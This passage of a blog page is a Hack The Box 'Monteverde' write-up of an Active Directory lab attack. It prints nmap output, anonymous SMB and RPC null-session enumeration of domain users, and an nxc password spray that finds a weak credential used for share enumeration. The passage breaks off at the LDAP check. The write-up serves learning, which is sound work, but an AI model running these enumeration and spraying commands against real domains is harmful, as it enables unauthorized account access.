@@ -1,0 +1,570 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <title>Monteverde // Cyber security blog</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="blackcaesar0" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="/css/main.min.4566c05e79be04e22fdb60fe026660a374366519139306a7223d2cab6fb660db.css" />
+    
+    <link rel="stylesheet" href="/css/custom.min.5af53ff6a9267e24ee96c3f1312dd379808c5a82b25f008d9e402843955e4f21.css" />
+    
+
+    
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Monteverde">
+  <meta name="twitter:description" content="HTB Monteverde – Full Pentest Report Date: June 3, 2025
+Tester: blackcaesar0 Team: The Offensive Security Initiative (OSI) Target IP: 10.129.228.111
+Domain: MEGABANK.LOCAL
+Hostname: MONTEVERDE
+Initial Reconnaissance In this phase, an Nmap scan was performed to identify open ports, services, and gather initial information about the target. The output below shows all relevant open services and their versions, confirming that this host is part of an Active Directory environment.
+[Jun 03, 2025 - 01:42:17 (UTC)] exegol-HTB Monteverde # nmap -A -O -T4 -Pn -oX Monteverde.xml 10.129.228.111 Starting Nmap 7.93 ( https://nmap.org ) at 2025-06-03 01:43 UTC Nmap scan report for 10.129.228.111 Host is up (0.093s latency). Not shown: 989 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-06-03 01:43:47Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port OS fingerprint not ideal because: Missing a closed TCP port so results incomplete No OS matches for host Network Distance: 2 hops Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 311: |_ Message signing enabled and required | smb2-time: | date: 2025-06-03T01:44:02 |_ start_date: N/A Key Observations:">
+
+    <meta property="og:url" content="https://blackcaesar0.com/hackthebox/monteverde/">
+  <meta property="og:site_name" content="Cyber security blog">
+  <meta property="og:title" content="Monteverde">
+  <meta property="og:description" content="HTB Monteverde – Full Pentest Report Date: June 3, 2025
+Tester: blackcaesar0 Team: The Offensive Security Initiative (OSI) Target IP: 10.129.228.111
+Domain: MEGABANK.LOCAL
+Hostname: MONTEVERDE
+Initial Reconnaissance In this phase, an Nmap scan was performed to identify open ports, services, and gather initial information about the target. The output below shows all relevant open services and their versions, confirming that this host is part of an Active Directory environment.
+[Jun 03, 2025 - 01:42:17 (UTC)] exegol-HTB Monteverde # nmap -A -O -T4 -Pn -oX Monteverde.xml 10.129.228.111 Starting Nmap 7.93 ( https://nmap.org ) at 2025-06-03 01:43 UTC Nmap scan report for 10.129.228.111 Host is up (0.093s latency). Not shown: 989 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-06-03 01:43:47Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port OS fingerprint not ideal because: Missing a closed TCP port so results incomplete No OS matches for host Network Distance: 2 hops Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 311: |_ Message signing enabled and required | smb2-time: | date: 2025-06-03T01:44:02 |_ start_date: N/A Key Observations:">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="hackthebox">
+    <meta property="article:published_time" content="2025-06-03T22:03:01+01:00">
+    <meta property="article:modified_time" content="2025-06-03T22:03:01+01:00">
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="/"><img class="app-header-avatar" src="/dragon.png" alt="blackcaesar0" /></a>
+      <span class="app-header-title">blackcaesar0</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/about/">About</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/hackthebox/">Hackthebox</a>
+      </nav>
+      <p>Exploring cybersecurity, ethical hacking, and digital forensics—one exploit at a time.</p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/blackcaesar0" target="_blank" rel="noreferrer noopener me">
+            <svg class="icon icon-brand-github" viewBox="0 0 24 24" fill="currentColor"><title>GitHub</title><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
+          </a>
+        
+          <a href="https://www.linkedin.com/in/blackcaesar0" target="_blank" rel="noreferrer noopener me">
+            <svg class="icon icon-brand-linkedin" viewBox="0 0 24 24" fill="currentColor"><title>LinkedIn</title><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Monteverde</h1>
+      <div class="post-meta">
+        <div>
+          <svg class="icon icon-calendar" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>calendar</title><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
+          Jun 3, 2025
+        </div>
+        <div>
+          <svg class="icon icon-clock" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>clock</title><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+          12 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="htb-monteverde--full-pentest-report">HTB Monteverde – Full Pentest Report</h1>
+<p><strong>Date:</strong> June 3, 2025<br>
+<strong>Tester:</strong> <strong>blackcaesar0</strong>                                                                                                                                         <br>
+<strong>Team:</strong> <strong>The Offensive Security Initiative (OSI)</strong>                                                                                                                <br>
+<strong>Target IP:</strong> <code>10.129.228.111</code></p>
+<p><strong>Domain:</strong> MEGABANK.LOCAL<br>
+<strong>Hostname:</strong> MONTEVERDE</p>
+<hr>
+<h3 id="initial-reconnaissance">Initial Reconnaissance</h3>
+<p>In this phase, an Nmap scan was performed to identify open ports, services, and gather initial information about the target. The output below shows all relevant open services and their versions, confirming that this host is part of an Active Directory environment.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#f92672">[</span>Jun 03, <span style="color:#ae81ff">2025</span> - 01:42:17 <span style="color:#f92672">(</span>UTC<span style="color:#f92672">)]</span> exegol-HTB Monteverde <span style="color:#75715e"># nmap -A -O -T4 -Pn -oX Monteverde.xml 10.129.228.111</span>
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-06-03 01:43 UTC
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.228.111
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.093s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">989</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>53/tcp   open  domain        Simple DNS Plus
+</span></span><span style="display:flex;"><span>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2025-06-03 01:43:47Z<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>135/tcp  open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds?
+</span></span><span style="display:flex;"><span>464/tcp  open  kpasswd5?
+</span></span><span style="display:flex;"><span>593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>636/tcp  open  tcpwrapped
+</span></span><span style="display:flex;"><span>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>3269/tcp open  tcpwrapped
+</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+</span></span><span style="display:flex;"><span>OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+</span></span><span style="display:flex;"><span>No OS matches <span style="color:#66d9ef">for</span> host
+</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">2</span> hops
+</span></span><span style="display:flex;"><span>Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   311: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2025-06-03T01:44:02
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span></code></pre></div><p><strong>Key Observations:</strong></p>
+<ul>
+<li>Ports 53 (DNS), 88 (Kerberos), 389/3268 (LDAP), 445 (SMB), 464 (Kerberos password change), 593 (RPC over HTTP) are open.</li>
+<li>Presence of Kerberos and LDAP strongly indicates an Active Directory domain controller or domain-joined server.</li>
+<li>SMB signing is required, and SMBv1 is disabled.</li>
+</ul>
+<h3 id="smb-enumeration">SMB Enumeration</h3>
+<p>Next, a manual SMB share enumeration was attempted to see if anonymous or null access was allowed.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#f92672">[</span>Jun 03, <span style="color:#ae81ff">2025</span> - 02:10:19 <span style="color:#f92672">(</span>UTC<span style="color:#f92672">)]</span> exegol-HTB Monteverde <span style="color:#75715e"># smbclient -L //megabank.local/ -N                                    </span>
+</span></span><span style="display:flex;"><span>Anonymous login successful
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	Sharename       Type      Comment
+</span></span><span style="display:flex;"><span>	---------       ----      -------
+</span></span><span style="display:flex;"><span>SMB1 disabled -- no workgroup available
+</span></span></code></pre></div><p><strong>Observations:</strong></p>
+<ul>
+<li>SMB1 is disabled.</li>
+<li>No shares were listed for anonymous login, indicating that credentials will be required to enumerate further.</li>
+</ul>
+<h3 id="rpc-enumeration">RPC Enumeration</h3>
+<p><strong>Remote Procedure Call (RPC)</strong>, as defined in <a href="https://datatracker.ietf.org/doc/rfc5531/">RFC 5531</a>, allows querying Windows domain information. A null session connection was used to enumerate user accounts and domain groups.</p>
+<h5 id="establishing-an-rpc-null-session">Establishing an RPC Null Session</h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#f92672">[</span>Jun 03, <span style="color:#ae81ff">2025</span> - 02:10:26 <span style="color:#f92672">(</span>UTC<span style="color:#f92672">)]</span> exegol-HTB Monteverde <span style="color:#75715e"># rpcclient -U &#39;&#39; -N &#34;megabank.local&#34;      </span>
+</span></span><span style="display:flex;"><span>rpcclient $&gt;
+</span></span></code></pre></div><h5 id="user-enumeration-querydispinfo">User Enumeration (<code>querydispinfo</code>)</h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-md" data-lang="md"><span style="display:flex;"><span>rpcclient $&gt; querydispinfo
+</span></span><span style="display:flex;"><span>index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2	Name: AAD_987d7f2f57d2	Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
+</span></span><span style="display:flex;"><span>index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos	Name: Dimitris Galanos	Desc: (null)
+</span></span><span style="display:flex;"><span>index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
+</span></span><span style="display:flex;"><span>index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope	Name: Mike Hope	Desc: (null)
+</span></span><span style="display:flex;"><span>index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary	Name: Ray O&#39;Leary	Desc: (null)
+</span></span><span style="display:flex;"><span>index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs	Name: SABatchJobs	Desc: (null)
+</span></span><span style="display:flex;"><span>index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan	Name: Sally Morgan	Desc: (null)
+</span></span><span style="display:flex;"><span>index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata	Name: svc-ata	Desc: (null)
+</span></span><span style="display:flex;"><span>index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec	Name: svc-bexec	Desc: (null)
+</span></span><span style="display:flex;"><span>index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp	Name: svc-netapp	Desc: (null)
+</span></span><span style="display:flex;"><span>rpcclient $&gt; enumdomgroups
+</span></span><span style="display:flex;"><span>group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
+</span></span><span style="display:flex;"><span>group:[Domain Users] rid:[0x201]
+</span></span><span style="display:flex;"><span>group:[Domain Guests] rid:[0x202]
+</span></span><span style="display:flex;"><span>group:[Domain Computers] rid:[0x203]
+</span></span><span style="display:flex;"><span>group:[Group Policy Creator Owners] rid:[0x208]
+</span></span><span style="display:flex;"><span>group:[Cloneable Domain Controllers] rid:[0x20a]
+</span></span><span style="display:flex;"><span>group:[Protected Users] rid:[0x20d]
+</span></span><span style="display:flex;"><span>group:[DnsUpdateProxy] rid:[0x44e]
+</span></span><span style="display:flex;"><span>group:[Azure Admins] rid:[0xa29]
+</span></span><span style="display:flex;"><span>group:[File Server Admins] rid:[0xa2e]
+</span></span><span style="display:flex;"><span>group:[Call Recording Admins] rid:[0xa2f]
+</span></span><span style="display:flex;"><span>group:[Reception] rid:[0xa30]
+</span></span><span style="display:flex;"><span>group:[Operations] rid:[0xa31]
+</span></span><span style="display:flex;"><span>group:[Trading] rid:[0xa32]
+</span></span><span style="display:flex;"><span>group:[HelpDesk] rid:[0xa33]
+</span></span><span style="display:flex;"><span>group:[Developers] rid:[0xa34]
+</span></span><span style="display:flex;"><span>rpcclient $&gt; querydominfo
+</span></span><span style="display:flex;"><span>Domain:		MEGABANK
+</span></span><span style="display:flex;"><span>Server:		
+</span></span><span style="display:flex;"><span>Comment:	
+</span></span><span style="display:flex;"><span>Total Users:	51
+</span></span><span style="display:flex;"><span>Total Groups:	0
+</span></span><span style="display:flex;"><span>Total Aliases:	23
+</span></span><span style="display:flex;"><span>Sequence No:	1
+</span></span><span style="display:flex;"><span>Force Logoff:	-1
+</span></span><span style="display:flex;"><span>Domain Server State:	0x1
+</span></span><span style="display:flex;"><span>Server Role:	ROLE_DOMAIN_PDC
+</span></span><span style="display:flex;"><span>Unknown 3:	0x1
+</span></span></code></pre></div><p><strong>Observations:</strong></p>
+<ul>
+<li>Discovered user accounts: <code>AAD_987d7f2f57d2</code>, <code>dgalanos</code>, <code>mhope</code>, <code>roleary</code>, <code>SABatchJobs</code>, <code>smorgan</code>, etc.</li>
+<li>Notable group “Azure Admins” (RID: 0xa29).</li>
+<li>Confirmed the domain name (MEGABANK) and that this host is the primary domain controller (ROLE_DOMAIN_PDC).</li>
+</ul>
+<h3 id="password-spraying--brute-force-attempts">Password Spraying / Brute-Force Attempts</h3>
+<p>Using the list of usernames gathered from RPC, a brute-force attempt was made by trying each username as its own password against SMB.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#f92672">[</span>Jun 03, <span style="color:#ae81ff">2025</span> - 02:42:49 <span style="color:#f92672">(</span>UTC<span style="color:#f92672">)]</span> exegol-HTB Monteverde <span style="color:#75715e"># nxc smb megabank.local -u users.txt -p users.txt</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.228.111  <span style="color:#ae81ff">445</span>    MONTEVERDE       <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:MONTEVERDE<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:MEGABANK.LOCAL<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.228.111  <span style="color:#ae81ff">445</span>    MONTEVERDE       <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> MEGABANK.LOCAL<span style="color:#ae81ff">\d</span>galanos:dgalanos STATUS_LOGON_FAILURE 
+</span></span><span style="display:flex;"><span>SMB         10.129.228.111  <span style="color:#ae81ff">445</span>    MONTEVERDE       <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> MEGABANK.LOCAL<span style="color:#ae81ff">\G</span>uest:dgalanos STATUS_LOGON_FAILURE 
+</span></span><span style="display:flex;"><span>SMB         10.129.228.111  <span style="color:#ae81ff">445</span>    MONTEVERDE       <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> MEGABANK.LOCAL<span style="color:#ae81ff">\m</span>hope:dgalanos STATUS_LOGON_FAILURE 
+</span></span><span style="display:flex;"><span>SMB         10.129.228.111  <span style="color:#ae81ff">445</span>    MONTEVERDE       <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> MEGABANK.LOCAL<span style="color:#ae81ff">\r</span>oleary:dgalanos STATUS_LOGON_FAILURE 
+</span></span><span style="display:flex;"><span>SMB         10.129.228.111  <span style="color:#ae81ff">445</span>    MONTEVERDE       <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> MEGABANK.LOCAL<span style="color:#ae81ff">\S</span>ABatchJobs:dgalanos STATUS_LOGON_FAILURE 
+</span></span><span style="display:flex;"><span>SMB         10.129.228.111  <span style="color:#ae81ff">445</span>    MONTEVERDE       <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> MEGABANK.LOCAL<span style="color:#ae81ff">\s</span>morgan:dgalanos STATUS_LOGON_FAILURE 
+</span></span><span style="display:flex;"><span>...<span style="color:#f92672">[</span>snip<span style="color:#f92672">]</span>...
+</span></span><span style="display:flex;"><span>SMB         10.129.228.111  <span style="color:#ae81ff">445</span>    MONTEVERDE       <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> MEGABANK.LOCAL<span style="color:#ae81ff">\:</span>roleary STATUS_LOGON_FAILURE 
+</span></span><span style="display:flex;"><span>SMB         10.129.228.111  <span style="color:#ae81ff">445</span>    MONTEVERDE       <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> MEGABANK.LOCAL<span style="color:#ae81ff">\d</span>galanos:SABatchJobs STATUS_LOGON_FAILURE 
+</span></span><span style="display:flex;"><span>SMB         10.129.228.111  <span style="color:#ae81ff">445</span>    MONTEVERDE       <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> MEGABANK.LOCAL<span style="color:#ae81ff">\G</span>uest:SABatchJobs STATUS_LOGON_FAILURE 
+</span></span><span style="display:flex;"><span>SMB         10.129.228.111  <span style="color:#ae81ff">445</span>    MONTEVERDE       <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> MEGABANK.LOCAL<span style="color:#ae81ff">\m</span>hope:SABatchJobs STATUS_LOGON_FAILURE 
+</span></span><span style="display:flex;"><span>SMB         10.129.228.111  <span style="color:#ae81ff">445</span>    MONTEVERDE       <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> MEGABANK.LOCAL<span style="color:#ae81ff">\r</span>oleary:SABatchJobs STATUS_LOGON_FAILURE 
+</span></span><span style="display:flex;"><span>SMB         10.129.228.111  <span style="color:#ae81ff">445</span>    MONTEVERDE       <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> MEGABANK.LOCAL<span style="color:#ae81ff">\S</span>ABatchJobs:SABatchJobs
+</span></span></code></pre></div><p><strong>Result:</strong></p>
+<ul>
+<li>Valid credentials found:<br>
+<code>MEGABANK.LOCAL\SABatchJobs:SABatchJobs</code></li>
+</ul>
+<h3 id="validating-sabatchjobs-access">Validating <code>SABatchJobs</code> Access</h3>
+<h5 id="winrm-access-check">WinRM Access Check</h5>
+<p>Confirmed that <code>SABatchJobs</code> does <strong>not</strong> have WinRM privileges.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#f92672">[</span>Jun 03, <span style="color:#ae81ff">2025</span> - 03:27:14 <span style="color:#f92672">(</span>UTC<span style="color:#f92672">)]</span> exegol-HTB Monteverde <span style="color:#75715e"># nxc winrm megabank.local -u SABatchJobs -p SABatchJobs</span>
+</span></span><span style="display:flex;"><span>WINRM       10.129.228.111  <span style="color:#ae81ff">5985</span>   MONTEVERDE       <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> <span style="color:#f92672">(</span>name:MONTEVERDE<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:MEGABANK.LOCAL<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>WINRM       10.129.228.111  <span style="color:#ae81ff">5985</span>   MONTEVERDE       <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> MEGABANK.LOCAL<span style="color:#ae81ff">\S</span>ABatchJobs:SABatchJobs
+</span></span></code></pre></div><h4 id="smb-share-enumeration">SMB Share Enumeration</h4>
+<p>Listing shares accessible to <code>SABatchJobs</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#f92672">[</span>Jun 03, <span style="color:#ae81ff">2025</span> - 03:26:44 <span style="color:#f92672">(</span>UTC<span style="color:#f92672">)]</span> exegol-HTB Monteverde <span style="color:#75715e"># nxc smb megabank.local -u SABatchJobs -p SABatchJobs --shares</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.228.111  <span style="color:#ae81ff">445</span>    MONTEVERDE       <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:MONTEVERDE<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:MEGABANK.LOCAL<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.228.111  <span style="color:#ae81ff">445</span>    MONTEVERDE       <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> MEGABANK.LOCAL<span style="color:#ae81ff">\S</span>ABatchJobs:SABatchJobs 
+</span></span><span style="display:flex;"><span>SMB         10.129.228.111  <span style="color:#ae81ff">445</span>    MONTEVERDE       <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumerated shares
+</span></span><span style="display:flex;"><span>SMB         10.129.228.111  <span style="color:#ae81ff">445</span>    MONTEVERDE       Share           Permissions     Remark
+</span></span><span style="display:flex;"><span>SMB         10.129.228.111  <span style="color:#ae81ff">445</span>    MONTEVERDE       -----           -----------     ------
+</span></span><span style="display:flex;"><span>SMB         10.129.228.111  <span style="color:#ae81ff">445</span>    MONTEVERDE       ADMIN$                          Remote Admin
+</span></span><span style="display:flex;"><span>SMB         10.129.228.111  <span style="color:#ae81ff">445</span>    MONTEVERDE       azure_uploads   READ            
+</span></span><span style="display:flex;"><span>SMB         10.129.228.111  <span style="color:#ae81ff">445</span>    MONTEVERDE       C$                              Default share
+</span></span><span style="display:flex;"><span>SMB         10.129.228.111  <span style="color:#ae81ff">445</span>    MONTEVERDE       E$                              Default share
+</span></span><span style="display:flex;"><span>SMB         10.129.228.111  <span style="color:#ae81ff">445</span>    MONTEVERDE       IPC$            READ            Remote IPC
+</span></span><span style="display:flex;"><span>SMB         10.129.228.111  <span style="color:#ae81ff">445</span>    MONTEVERDE       NETLOGON        READ            Logon server share 
+</span></span><span style="display:flex;"><span>SMB         10.129.228.111  <span style="color:#ae81ff">445</span>    MONTEVERDE       SYSVOL          READ            Logon server share 
+</span></span><span style="display:flex;"><span>SMB         10.129.228.111  <span style="color:#ae81ff">445</span>    MONTEVERDE       users$          READ  
+</span></span></code></pre></div><p><strong>Observations:</strong></p>
+<ul>
+<li>Accessible shares: <code>azure_uploads</code>, <code>users$</code>, <code>NETLOGON</code>, <code>SYSVOL</code>, <code>IPC$</code>.</li>
+<li>The presence of “azure_uploads” suggests possible Azure AD integration.</li>
+</ul>
+<h4 id="ldap-access-check">LDAP Access Check</h4>
+<p>Ensured that <code>SABatchJobs</code> can bind over LDAP:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#f92672">[</span>Jun 03, <span style="color:#ae81ff">2025</span> - 03:27:01 <span style="color:#f92672">(</span>UTC<span style="color:#f92672">)]</span> exegol-HTB Monteverde <span style="color:#75715e"># nxc ldap megabank.local -u SABatchJobs -p SABatchJobs</span>
